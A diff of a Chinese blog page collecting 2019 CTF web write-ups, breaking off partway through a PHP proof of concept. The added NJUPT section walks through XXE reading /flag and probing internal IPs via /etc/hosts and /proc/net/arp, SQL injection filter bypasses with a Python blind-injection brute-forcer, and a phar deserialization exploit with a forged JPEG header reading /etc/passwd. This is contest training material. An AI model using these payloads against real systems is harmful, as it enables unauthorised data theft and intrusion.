@@ -8,13 +8,13 @@
   <link rel="dns-prefetch" href="https://knlvre.github.io/Knlvre.github-io">
   <title>2019年11月份 CTF Write Up 集合 | Knlvre</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="UNCTF、上海 CTF、湖湘杯复赛  UNCTF时间：2019年10月22日 — 2019年10月27日 因为 Write Up 和 复现环境出现得比较晚，所以放到 11 月写 记录 bypass 考点：RCE（命令执行），PHP正则匹配反斜杠的特点，文件通配符，Linux 命令换行，Linux 命令终止符  开始做题前先清楚几个知识点： ① PHP正则匹配反斜杠的特点 在本题的preg_ma">
+  <meta name="description" content="UNCTF、上海 CTF、湖湘杯复赛、成都大学第二届玄武杯、NJUPT CTF  UNCTF时间：2019年10月22日 — 2019年10月27日 因为 Write Up 和 复现环境出现得比较晚，所以放到 11 月写 记录 bypass 考点：RCE（命令执行），PHP正则匹配反斜杠的特点，文件通配符，Linux 命令换行，Linux 命令终止符  开始做题前先清楚几个知识点： ① PHP正">
 <meta name="keywords" content="CTF比赛">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2019年11月份 CTF Write Up 集合">
 <meta property="og:url" content="https://knlvre.github.io/Knlvre.github-io/2019/11/01/2019年11月份 CTF Write Up 集合/index.html">
 <meta property="og:site_name" content="Knlvre">
-<meta property="og:description" content="UNCTF、上海 CTF、湖湘杯复赛  UNCTF时间：2019年10月22日 — 2019年10月27日 因为 Write Up 和 复现环境出现得比较晚，所以放到 11 月写 记录 bypass 考点：RCE（命令执行），PHP正则匹配反斜杠的特点，文件通配符，Linux 命令换行，Linux 命令终止符  开始做题前先清楚几个知识点： ① PHP正则匹配反斜杠的特点 在本题的preg_ma">
+<meta property="og:description" content="UNCTF、上海 CTF、湖湘杯复赛、成都大学第二届玄武杯、NJUPT CTF  UNCTF时间：2019年10月22日 — 2019年10月27日 因为 Write Up 和 复现环境出现得比较晚，所以放到 11 月写 记录 bypass 考点：RCE（命令执行），PHP正则匹配反斜杠的特点，文件通配符，Linux 命令换行，Linux 命令终止符  开始做题前先清楚几个知识点： ① PHP正">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/1-1.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/1-2.png">
@@ -142,10 +142,85 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/5-2.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/5-3.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/8-1.png">
-<meta property="og:updated_time" content="2019-11-21T07:54:02.617Z">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/1-1.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/1-2.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/1-3.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/2-1.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/2-2.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/2-3.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/2-4.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/2-5.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/3-1.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/3-2.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/3-5.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/3-4.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/3-6.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/3-7.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/3-8.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/3-3.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/4-1.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/4-3.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/4-2.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/4-4.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/4-5.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/4-6.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/4-7.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/4-8.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/4-9.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/4-10.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/4-11.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/4-12.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/4-13.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/4-14.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/5-1.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/5-3.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/5-2.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/5-4.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/5-5.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/6-1.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/6-2.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/6-3.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/6-4.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/6-5.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/6-6.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/7-1.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/7-2.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/7-3.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/7-4.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/7-5.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/7-6.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/8-1.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/8-2.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/8-3.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/8-4.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/8-5.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/8-6.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/8-7.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/9-1.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/9-2.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/9-5.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/9-6.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/9-3.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/9-4.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/9-7.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/9-8.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/9-10.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/10-1.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/10-2.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/10-3.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/10-4.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/11-1.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/11-2.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/11-3.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/11-4.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/11-5.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/11-6.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/11-7.png">
+<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/CTF/NJUPT/11-8.png">
+<meta property="og:updated_time" content="2019-11-26T08:35:19.676Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="2019年11月份 CTF Write Up 集合">
-<meta name="twitter:description" content="UNCTF、上海 CTF、湖湘杯复赛  UNCTF时间：2019年10月22日 — 2019年10月27日 因为 Write Up 和 复现环境出现得比较晚，所以放到 11 月写 记录 bypass 考点：RCE（命令执行），PHP正则匹配反斜杠的特点，文件通配符，Linux 命令换行，Linux 命令终止符  开始做题前先清楚几个知识点： ① PHP正则匹配反斜杠的特点 在本题的preg_ma">
+<meta name="twitter:description" content="UNCTF、上海 CTF、湖湘杯复赛、成都大学第二届玄武杯、NJUPT CTF  UNCTF时间：2019年10月22日 — 2019年10月27日 因为 Write Up 和 复现环境出现得比较晚，所以放到 11 月写 记录 bypass 考点：RCE（命令执行），PHP正则匹配反斜杠的特点，文件通配符，Linux 命令换行，Linux 命令终止符  开始做题前先清楚几个知识点： ① PHP正">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/1-1.png">
   
     <link rel="alternative" href="/atom.xml" title="Knlvre" type="application/atom+xml">
@@ -285,7 +360,7 @@
     <div class="article-entry" itemprop="articleBody">
       
         <blockquote>
-<p>UNCTF、上海 CTF、湖湘杯复赛</p>
+<p>UNCTF、上海 CTF、湖湘杯复赛、成都大学第二届玄武杯、NJUPT CTF</p>
 </blockquote>
 <h1 id="UNCTF"><a href="#UNCTF" class="headerlink" title="UNCTF"></a>UNCTF</h1><p>时间：2019年10月22日 — 2019年10月27日</p>
 <p>因为 Write Up 和 复现环境出现得比较晚，所以放到 11 月写</p>
@@ -921,6 +996,223 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">no <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">$f1 = @$_GET[<span class="string">'f1'</span>];</span><br><span class="line">$f2 = @$_POST[<span class="string">'f2'</span>];</span><br><span class="line">$f3 = @$_COOKIE[<span class="string">'f3'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($f2 !== <span class="string">'0'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'no'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>($f1 == <span class="number">0</span> <span class="keyword">and</span> $f1 !== <span class="number">0</span>) &#123;</span><br><span class="line">        $f2 == $f3;</span><br><span class="line">        <span class="keyword">if</span>(md5($f2) == <span class="number">0</span> <span class="keyword">and</span> $f2 == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/8-1.png" alt="8-1"></p>
 <p><code>$f2</code>和<code>$f3</code>全部传入字符串的<code>0</code>就可以了</p>
+<h1 id="NJUPT-CTF-2019"><a href="#NJUPT-CTF-2019" class="headerlink" title="NJUPT CTF 2019"></a>NJUPT CTF 2019</h1><p>一共记录 11 道 Web 题目</p>
+<h2 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h2><p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\1-1.png" alt="1-1"></p>
+<p>抓到的请求当中，看到疑似<code>XXE</code></p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\1-2.png" alt="1-2"></p>
+<p>根据题目提示</p>
+<blockquote>
+<p>flag in /flag</p>
+</blockquote>
+<p>直接拿到 flag</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\1-3.png" alt="1-3"></p>
+<h2 id="True-XML-cookbook"><a href="#True-XML-cookbook" class="headerlink" title="True XML cookbook"></a>True XML cookbook</h2><p>与上一题同样的界面</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\2-1.png" alt="2-1"></p>
+<p>尝试，但是相比之前，没有返回了</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\2-2.png" alt="2-2"></p>
+<p>但是可以读取其他文件，说明这里是 flag 的位置换了</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\2-3.png" alt="2-3"></p>
+<p>读取源码没看到可以利用的点，只能想到利用<code>xxe</code>进行<code>ssrf</code>打内网，扫描一下储存内网 IP 的几个文件：<code>/etc/hosts</code>，<code>/proc/net/arp</code>，<code>/proc/net/fib_trie</code>。然后在<code>ARP表</code>中发现很多内网 IP</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\2-4.png" alt="2-4"></p>
+<p>通过<code>http://</code>协议访问<code>192.168.1.8</code>，直接拿到 flag</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\2-5.png" alt="2-5"></p>
+<h2 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h2><p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\3-1.png" alt="3-1"></p>
+<p>并且有弹窗提示</p>
+<blockquote>
+<p>try to make the sqlquery have its own results</p>
+</blockquote>
+<p>测试发现先对<code>POST</code>的值进行<code>URL解码</code>然后进行匹配，过滤了<code>in、-、#、&#39;、or、and、空格</code></p>
+<p>无法使用任何注释符，只能是通过<code>反斜杠（\）</code>将原本接在 username 的后一个单引号给注释掉，然后 username 的前一个单引号与 password 的前一个单引号闭合。最后的单引号用<code>%00</code>截断掉 password 的第二个单引号（PHP 会判断 %00 为字符串结束符，所以字符串只到这里，最后的单引号会被当做不在字符串内，也就不传入 sql 语句中）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=123\&amp;passwd=||1;%00</span><br></pre></td></tr></table></figure>
+<p>拼接后的字符串就是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$string = <span class="string">"select * from users where username='123\' and passwd='||1;%00'"</span></span><br></pre></td></tr></table></figure>
+<p>传入数据库部分就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&apos;123\&apos; and passwd=&apos;||1;</span><br></pre></td></tr></table></figure>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\3-2.png" alt="3-2"></p>
+<p>出现 302 跳转，跟随跳转后提示</p>
+<blockquote>
+<p>hello friend,go back to get the password</p>
+</blockquote>
+<p>那就回来从<code>passwd</code>变量注，但是过滤了许多关键词：<code>substr、mid、select、database</code>。截取字符串的函数只剩下<code>right、left</code>但是逗号却被过滤了，也无法使用。现在就只能使用<code>regexp</code>对每个字符逐一匹配</p>
+<p>因为这里过滤了<code>单引号 &amp; 双引号</code>，所以我们自己构造的语句就无法匹配字符串</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\3-5.png" alt="3-5"></p>
+<p>但是这可以用<code>十六进制代替</code>，因为<code>mysql</code>是接受<code>十六进制</code>的（前面要加0x），并且会将十六进制转<code>ASCII</code></p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\3-4.png" alt="3-4"></p>
+<p>先尝试<code>0x61（也就是 a）</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=123\&amp;passwd=||username/**/regexp/**/0x61;%00</span><br></pre></td></tr></table></figure>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\3-6.png" alt="3-6"></p>
+<p>发现之前的提示：<code>try to make the sqlquery have its own results</code>没了，说明是可以利用的。所以现在结合还可以使用的<code>ascii()</code>函数，写爆破 EXP：</p>
+<p>Ps：① 因为直接传入<code>%00</code>会被黑名单检测到，所以这里的 python 代码中可以用<code>chr(0)</code>代替；② 因为有一次跑出来的结果是<code>er_know7788990</code>，发现是不完整的，于是手动注第一个字母（除了 e 之外，就是 0x79 了），再开始</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,string</span><br><span class="line"></span><br><span class="line">all_strings = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_"</span></span><br><span class="line">url = <span class="string">"http://nctf2019.x1ct34m.com:40005/index.php"</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">"username"</span>:<span class="string">"123\\"</span>,</span><br><span class="line">	<span class="string">"passwd"</span>:<span class="string">"||passwd/**/regexp/**/0x79;"</span> + chr(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> all_strings:</span><br><span class="line">		response = requests.post(url=url,data=data)</span><br><span class="line">		<span class="keyword">if</span>(<span class="string">"try to make the sqlquery have its own results"</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> <span class="string">"hack"</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text):</span><br><span class="line">			print(data)</span><br><span class="line">			data[<span class="string">"passwd"</span>]  = data[<span class="string">"passwd"</span>][<span class="number">0</span>:<span class="number">-2</span>] + hex(ord(i))[<span class="number">-2</span>:] + <span class="string">";"</span> + chr(<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			data[<span class="string">"passwd"</span>] = data[<span class="string">"passwd"</span>][<span class="number">0</span>:<span class="number">-4</span>] + hex(ord(i))[<span class="number">-2</span>:] + <span class="string">";"</span> + chr(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\3-7.png" alt="3-7"></p>
+<p>转换得到明文</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\3-8.png" alt="3-8"></p>
+<p>任意用户名，然后用刚才注出来的密码登陆，拿下 flag</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\3-3.png" alt="3-3"></p>
+<h2 id="phar-matches-everything"><a href="#phar-matches-everything" class="headerlink" title="phar matches everything"></a>phar matches everything</h2><p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\4-1.png" alt="4-1"></p>
+<p>上传文件的地方，尝试后提示只能上传<code>jpg、png、gif、jpeg</code></p>
+<blockquote>
+<p>File is not an image.Sorry, only jpg,png,gif,jpeg are allowed.Sorry, your file was not uploaded.  </p>
+</blockquote>
+<p>可以通过添加jpg的文件头绕过，但是生成的文件后缀是<code>jpeg</code>，没有本地文件包含漏洞也无法使用</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\4-3.png" alt="4-3"></p>
+<p>回想题目第一个提示</p>
+<blockquote>
+<p> I hate VIM. </p>
+</blockquote>
+<p>是 VIM 编辑留下的备份文件，可能会留下<code>.swp</code>的备份文件，尝试后发现<code>.catchmime.php.swp</code>，下载源码</p>
+<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\CTF\NJUPT\4-2.png" alt="4-2"></p>
+<p>通过如下命令恢复<code>swp</code>备份文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vi -r catchmime.php.swp</span><br></pre></td></tr></table></figure>
+<p>看到如下代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123; </span><br><span class="line">    <span class="keyword">protected</span> $test; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">funny_get</span><span class="params">()</span></span>&#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;test; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123; </span><br><span class="line">    <span class="keyword">public</span> $url; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123; </span><br><span class="line">        $ch = curl_init();   </span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$url); </span><br><span class="line">        curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>); </span><br><span class="line">        $output=curl_exec($ch); </span><br><span class="line">        curl_close($ch); </span><br><span class="line">        <span class="keyword">return</span> $output; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span><br><span class="line">    $this_is_a_easy_test=unserialize($_GET[<span class="string">'careful'</span>]); </span><br><span class="line">    <span class="keyword">if</span>($this_is_a_easy_test-&gt;funny_get() === <span class="string">'1'</span>)&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;curl(<span class="keyword">$this</span>-&gt;url); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123; </span><br><span class="line">    $check = getimagesize($_POST[<span class="string">'name'</span>]); </span><br><span class="line">    <span class="keyword">if</span>($check !== <span class="keyword">false</span>) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is an image - "</span> . $check[<span class="string">"mime"</span>] . <span class="string">"."</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is not an image."</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>unserialize()</code>只有一个，但是有2个类需要反序列化，但是有<code>getimagesize()</code>可以利用 phar 反序列化，构造如下 POC</p>
+<p>Ps：这里要注意，上传的文件名后缀必须是jpeg，而且通过getimagesize函数检测文件类型是否是jpeg，所以在phar文件头部分加入一个jpg文件头部即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $test;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;test = <span class="string">'1'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $url;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;url = <span class="string">"file:///etc/passwd"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar_file = <span class="string">"knlvre.phar"</span>;</span><br><span class="line">unlink($phar_file);</span><br><span class="line"></span><br><span class="line">$e = <span class="keyword">new</span> Easytest();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($e)).<span class="string">"\n"</span>;</span><br><span class="line">$f=<span class="keyword">new</span> Main();</span><br><span class="line"><span class="comment">//echo serialize($f);</span></span><br><span class="line">$jpg_header = hex2bin(<span class="string">'FFD8FFE000104A46494600010100000100010000FFDB004300080606070605080707070909080A0C140D0C0B0B0C1912130F141D1A1F1E1D1A1C1C20242E2720222C231C1C2837292C30313434341F27393D38323C2E333432FFDB0043010909090C0B0C180D0D1832211C213232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232FFC0'</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar($phar_file);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span 